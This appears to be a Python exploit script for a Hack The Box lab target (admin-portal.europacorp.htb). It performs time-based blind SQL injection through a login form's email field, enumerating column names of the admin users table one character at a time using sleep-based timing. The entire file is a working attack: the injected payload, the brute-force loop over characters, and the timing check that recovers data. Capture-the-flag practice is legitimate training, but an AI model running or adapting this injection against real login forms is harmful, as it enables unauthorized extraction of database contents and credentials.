#!/usr/bin/python3
# coding:utf-8

from pwn import *
import requests,urllib3,sys,signal,pdb,time,string

def def_handler(sig, frame):
	print("\nSaindo...\n")
	sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variable_Global
main_url = "https://admin-portal.europacorp.htb/login.php"
burp = {'http': 'http://127.0.0.1:8080'}
characters = string.ascii_lowercase + string.digits + string.punctuation

def makeSqli():

	urllib3.disable_warnings()
	s = requests.session()
	s.verify = False

	p1 = log.progress("Sqli_brute_force")
	p1.status("Start")
	time.sleep(2)

	p2 = log.progress("Dump")
	dump = ''

	for num in range(1,100):
		for character in characters:

			p1.status(f"Verify: {character}")

			data_post = {
				'email': f"test@test.htb' or if(substr((select group_concat(column_name) from information_schema.columns where table_schema=\"admin\" and table_name=\"users\"),{num},1)='{character}',sleep(2),1)-- -",
				'password': 'test'
			}

			time_start = time.time()
			r = s.post(main_url, data=data_post)
			time_end = time.time()

			if time_end - time_start > 2:
				dump += character
				p2.status(dump)
				break

if __name__ == '__main__':
	makeSqli()
